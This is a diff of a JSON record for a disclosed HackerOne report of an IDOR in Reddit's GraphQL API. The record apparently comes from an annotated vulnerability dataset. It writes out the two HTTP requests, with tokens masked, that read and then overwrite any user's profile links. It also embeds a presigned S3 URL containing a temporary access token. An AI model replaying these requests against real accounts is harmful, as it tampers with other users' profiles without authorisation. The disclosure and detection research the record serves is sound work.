@@ -1,50 +1,50 @@
 {
-    "reported_to": "Reddit",
-    "reported_by": "criptex ",
-    "title": "IDOR allows an attacker to modify the links of any user",
-    "content": "\nHi team!\nI found an IDOR which allows to modify the links of any user.\nUsers can put their custom links or social media links on their profile, ex:\n<image_0>\nTo reproduce this:\nReplicate the following request by replacing it with your own authentication headers: You must also put in the body of the request, in the parameter \"username\" the username that you want, you can try my username: \"criptexhackerone1\". This request will return in the response the links of any user profile with the \"id\" of each link.\nCode 935 Bytes\n1POST / HTTP/2\n2Host: gql.reddit.com\n3Content-Length: 62\n4Sec-Ch-Ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"\n5X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *\n6Sec-Ch-Ua-Mobile: ?0\n7Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *\n8Content-Type: application/json\n9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36\n10X-Reddit-Compression: 1\n11X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\n12Sec-Ch-Ua-Platform: \"Windows\"\n13Accept: */*\n14Origin: https://www.reddit.com\n15Sec-Fetch-Site: same-site\n16Sec-Fetch-Mode: cors\n17Sec-Fetch-Dest: empty\n18Referer: https://www.reddit.com/\n19Accept-Encoding: gzip, deflate\n20Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5\n21\n22{\"id\":\"11a239b07f86\",\"variables\":{\"username\":\"*********\"}}\nWhen you get some \"id\" save it.\nIn the next request you have to put in the request body, in the \"id\" parameter the previously saved id, you can also change the name and the link:\nCode 902 Bytes\n1POST / HTTP/2\n2Host: gql.reddit.com\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0\n4Accept: */*\n5Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/json\n8Content-Length: 173\n9X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\n10X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\n11X-Reddit-Compression: 1\n12Origin: https://www.reddit.com\n13Sec-Fetch-Dest: empty\n14Sec-Fetch-Mode: cors\n15Sec-Fetch-Site: same-site\n16Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\n17Referer: https://www.reddit.com/\n18Te: trailers\n19\n20{\"id\":\"c558e604581f\",\"variables\":{\"input\":{\"socialLinks\":[{\"outboundUrl\":\"https://www.hackerone.com\",\"title\":\"hacker\",\"type\":\"CUSTOM\",\"id\":\"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\"}]}}}\nFinally re-enter the victim's profile and you will see the modified links. It is important to mention that you may have to reload the page a few times or wait a few seconds.\nImpact\nA real attacker can modify the name and content of any user's social links. It is important to add that social links are something main in user profiles, if an attacker exploits this with all reddit users it could be devastating.\nBest Regards!!!\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Reddit",
+  "reported_by": "criptex ",
+  "title": "IDOR allows an attacker to modify the links of any user",
+  "content": "\nHi team!\nI found an IDOR which allows to modify the links of any user.\nUsers can put their custom links or social media links on their profile, ex:\n<image_0>\nTo reproduce this:\nReplicate the following request by replacing it with your own authentication headers: You must also put in the body of the request, in the parameter \"username\" the username that you want, you can try my username: \"criptexhackerone1\". This request will return in the response the links of any user profile with the \"id\" of each link.\nCode 935 Bytes\n1POST / HTTP/2\n2Host: gql.reddit.com\n3Content-Length: 62\n4Sec-Ch-Ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"\n5X-Reddit-Loid:  * * ** * * * * * * * * * * ** * *  * * * * * * * * *  * * * * *  *\n6Sec-Ch-Ua-Mobile: ?0\n7Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *\n8Content-Type: application/json\n9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/531.36\n10X-Reddit-Compression: 1\n11X-Reddit-Session:  * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\n12Sec-Ch-Ua-Platform: \"Windows\"\n13Accept: */*\n14Origin: https://www.reddit.com\n15Sec-Fetch-Site: same-site\n16Sec-Fetch-Mode: cors\n17Sec-Fetch-Dest: empty\n18Referer: https://www.reddit.com/\n19Accept-Encoding: gzip, deflate\n20Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7,bs;q=0.6,ja;q=0.5\n21\n22{\"id\":\"11a239b07f86\",\"variables\":{\"username\":\"*********\"}}\nWhen you get some \"id\" save it.\nIn the next request you have to put in the request body, in the \"id\" parameter the previously saved id, you can also change the name and the link:\nCode 902 Bytes\n1POST / HTTP/2\n2Host: gql.reddit.com\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0\n4Accept: */*\n5Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/json\n8Content-Length: 173\n9X-Reddit-Loid: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\n10X-Reddit-Session: * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\n11X-Reddit-Compression: 1\n12Origin: https://www.reddit.com\n13Sec-Fetch-Dest: empty\n14Sec-Fetch-Mode: cors\n15Sec-Fetch-Site: same-site\n16Authorization: Bearer * * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\n17Referer: https://www.reddit.com/\n18Te: trailers\n19\n20{\"id\":\"c558e604581f\",\"variables\":{\"input\":{\"socialLinks\":[{\"outboundUrl\":\"https://www.hackerone.com\",\"title\":\"hacker\",\"type\":\"CUSTOM\",\"id\":\"* * * * * * * * *  * * * * *  * * * * * * * * * *  * * * * *  *\"}]}}}\nFinally re-enter the victim's profile and you will see the modified links. It is important to mention that you may have to reload the page a few times or wait a few seconds.\nImpact\nA real attacker can modify the name and content of any user's social links. It is important to add that social links are something main in user profiles, if an attacker exploits this with all reddit users it could be devastating.\nBest Regards!!!\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Insecure Direct Object Reference (IDOR)"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1tog39bj13zij8wqoo4gsrsmzgao?response-content-disposition=attachment%3B%20filename%3D%22links.png%22%3B%20filename%2A%3DUTF-8%27%27links.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7W75TSZN%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T014056Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDRgk%2FVlweoHzHRb59pInKBD64s3N6dDGYXh8mUlA4YvAiEA6oUy0DpBWsbwrT2Re%2FT7M1bhOA%2BtHqEfAiKMGVkoTIoquwUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEvA6I9u06EhQTWhZyqPBTGXfTv%2Ft6JSQSLXA3hUBIEbcjiIrLTDH%2BWl2tR5oTXdklGwB1URZBiVx6FPSqDdOlomItRkl4kOLsMuT3SLwloyaqxg3j5K55Lk9UW0nnY96T%2FWVQYQETyWrFeksis3aOpPdQefQrSsPGMLbTEp1P040XpxSGswSmJ21aXu9rziWreXHF5QZQI%2FphF%2BAy3LlUwNJaeZRV9mrg0%2Bk3KLJTQ%2Ft3jwWi7vuuENmY1WE%2F8eBTBUyLbqU4bvwaswyOMtW%2FEaZpRT5kSOv1Uxp38NIFxi7lymfYxAydGpRORVNJtLbWCeAgq9msWZxO0hQfCK6yIVIUSFOzPIYARF08T9wANRV7KbqBTmRmJIDRbE56j07Je0VKEMWMU3b7wGNOm4kLQyEY4AcVPu8sSv7QlWE7cxiEl993lOCbgtddOOwZv5TL6843t8FWaEQPfQty9LFP%2FB07iU9WsIJJGzhtoTa5lLwPyELvmD2aOGCRupEg69wyz%2F7FO9AzNm5aOEK9B2dSk28pNvQxM%2FFrQ2HZmuOOtdtFC6dtoWOFnjKicrS1193Jlu8hAg1ZfzMNK9rJg8qFrl53kqG%2FLdQyN%2BSBBrtSCLGHma%2F9IF6wsyqswBPHJdUQb95fJX4%2BbpLkvxR4xihzogJ2OaohFffttoRJ4mLeGY3Oxwswp6OZdfKuq0gAssRvyhSCfdQpY3FVJ%2BxthHvdoi%2Fxwj7%2BxgRQuYEOzBrURqraXTCTPLEBqvrf4PP7rVd94C0TEA%2BiOzAKp5%2FX%2FuyuwxyS34yVW9NG1nFtm3rKx0BzVVR42wBBF4RlVBQ%2BB5D6fQgdPL2Bv%2BD4PfkvQqy1qyP4wLd99PPyluhO6rEgYGW%2BbA96MxcrKqu%2BuS7A4w092HvwY6sQERl0awffJVJRn0IfsgQXaK01yw4SraNWW6sahJu%2FqnRUpUW0mtzYKKzkwFKsTVEIvNsjgH0wKwkkhwU7nOIZK6y8znJoxXBB%2B5ArfqWS0%2BKSxxbv3%2BZ08r1YxxjPDnL00ND4Dxdi%2FKBmV4DSjXDlx1hiZACj11vvh6RJ%2B2VYOh5ijEa5f73k9HdD9WxoszC9Z9qsbNRQlVF80mazdvFs1VbVoCroakrXuqXDE02m9QMD0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=011caf11675e976257f1401124e2f5a78735f9b46c3729771b4872aca52bd0ec"
+  },
+  "disclosed_date": 1664564940,
+  "report_url": "https://hackerone.com/reports/1661113",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Send a POST request to / with authentication headers and specify the target username in the body to retrieve the user's link IDs."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Insecure Direct Object Reference (IDOR)"
-    ],
-    "screenshots": {
-        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1tog39bj13zij8wqoo4gsrsmzgao?response-content-disposition=attachment%3B%20filename%3D%22links.png%22%3B%20filename%2A%3DUTF-8%27%27links.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7W75TSZN%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T014056Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDRgk%2FVlweoHzHRb59pInKBD64s3N6dDGYXh8mUlA4YvAiEA6oUy0DpBWsbwrT2Re%2FT7M1bhOA%2BtHqEfAiKMGVkoTIoquwUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEvA6I9u06EhQTWhZyqPBTGXfTv%2Ft6JSQSLXA3hUBIEbcjiIrLTDH%2BWl2tR5oTXdklGwB1URZBiVx6FPSqDdOlomItRkl4kOLsMuT3SLwloyaqxg3j5K55Lk9UW0nnY96T%2FWVQYQETyWrFeksis3aOpPdQefQrSsPGMLbTEp1P040XpxSGswSmJ21aXu9rziWreXHF5QZQI%2FphF%2BAy3LlUwNJaeZRV9mrg0%2Bk3KLJTQ%2Ft3jwWi7vuuENmY1WE%2F8eBTBUyLbqU4bvwaswyOMtW%2FEaZpRT5kSOv1Uxp38NIFxi7lymfYxAydGpRORVNJtLbWCeAgq9msWZxO0hQfCK6yIVIUSFOzPIYARF08T9wANRV7KbqBTmRmJIDRbE56j07Je0VKEMWMU3b7wGNOm4kLQyEY4AcVPu8sSv7QlWE7cxiEl993lOCbgtddOOwZv5TL6843t8FWaEQPfQty9LFP%2FB07iU9WsIJJGzhtoTa5lLwPyELvmD2aOGCRupEg69wyz%2F7FO9AzNm5aOEK9B2dSk28pNvQxM%2FFrQ2HZmuOOtdtFC6dtoWOFnjKicrS1193Jlu8hAg1ZfzMNK9rJg8qFrl53kqG%2FLdQyN%2BSBBrtSCLGHma%2F9IF6wsyqswBPHJdUQb95fJX4%2BbpLkvxR4xihzogJ2OaohFffttoRJ4mLeGY3Oxwswp6OZdfKuq0gAssRvyhSCfdQpY3FVJ%2BxthHvdoi%2Fxwj7%2BxgRQuYEOzBrURqraXTCTPLEBqvrf4PP7rVd94C0TEA%2BiOzAKp5%2FX%2FuyuwxyS34yVW9NG1nFtm3rKx0BzVVR42wBBF4RlVBQ%2BB5D6fQgdPL2Bv%2BD4PfkvQqy1qyP4wLd99PPyluhO6rEgYGW%2BbA96MxcrKqu%2BuS7A4w092HvwY6sQERl0awffJVJRn0IfsgQXaK01yw4SraNWW6sahJu%2FqnRUpUW0mtzYKKzkwFKsTVEIvNsjgH0wKwkkhwU7nOIZK6y8znJoxXBB%2B5ArfqWS0%2BKSxxbv3%2BZ08r1YxxjPDnL00ND4Dxdi%2FKBmV4DSjXDlx1hiZACj11vvh6RJ%2B2VYOh5ijEa5f73k9HdD9WxoszC9Z9qsbNRQlVF80mazdvFs1VbVoCroakrXuqXDE02m9QMD0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=011caf11675e976257f1401124e2f5a78735f9b46c3729771b4872aca52bd0ec"
-    },
-    "disclosed_date": 1664564940,
-    "report_url": "https://hackerone.com/reports/1661113",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "LOW",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Send a POST request to / with authentication headers and specify the target username in the body to retrieve the user's link IDs."
-        ],
-        [
-            2,
-            "Send another POST request with the retrieved link ID in the body to modify the link's name and URL."
-        ]
-    ],
-    "vuln_description": "An Insecure Direct Object Reference (IDOR) vulnerability allows an attacker to modify the social media links of any user profile by manipulating the link IDs obtained from a GraphQL request.",
-    "reason": "The vulnerability involves straightforward manipulation of object references without proper authorization checks. The steps are clear and do not require complex interactions or understanding of subtle application states.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": false,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": false
-    }
+    [
+      2,
+      "Send another POST request with the retrieved link ID in the body to modify the link's name and URL."
+    ]
+  ],
+  "vuln_description": "An Insecure Direct Object Reference (IDOR) vulnerability allows an attacker to modify the social media links of any user profile by manipulating the link IDs obtained from a GraphQL request.",
+  "reason": "The vulnerability involves straightforward manipulation of object references without proper authorization checks. The steps are clear and do not require complex interactions or understanding of subtle application states.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an IDOR where an authenticated user can modify another user's social links by swapping the 'username' parameter in the request. This falls under the methodology of testing (user_session, action, resource_id) tuples by substituting resource_ids (usernames in this case) with existing ones to test authorization boundaries. The detection method involves collecting these tuples and automatically testing them with different user sessions and resource_ids, which would catch this type of vulnerability.",
+    "is_detectable": true
+  }
 }
